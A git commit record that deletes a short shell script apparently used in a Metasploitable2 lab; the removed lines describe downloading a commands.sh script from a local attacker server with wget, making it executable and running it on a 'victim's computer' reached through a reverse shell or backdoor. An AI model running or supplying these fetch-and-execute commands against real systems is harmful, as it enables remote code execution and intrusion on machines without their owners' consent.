7a701559ddcaa4d1d9c8c9a7e357ab6f9f632a44
ghostface <wseven347.devopser@gmail.com>
2025-01-26 03:41:59 -0700

    Delete reverse-sh-or-metasploitable2-commands.sh

--- reverse-sh-or-metasploitable2-commands.sh
+++
@@ -1,6 +0,0 @@
-# here are the commands required to download the commands.sh script and run it, they can be executed as soon as we are on the victim’s computer using a reverse shell or backdoor
-
-# wget <IP addr kali | server>:8080/commands.sh
-wget 192.168.1.100:8080/commands.sh
-chmod +x commands.sh
-./commands.sh
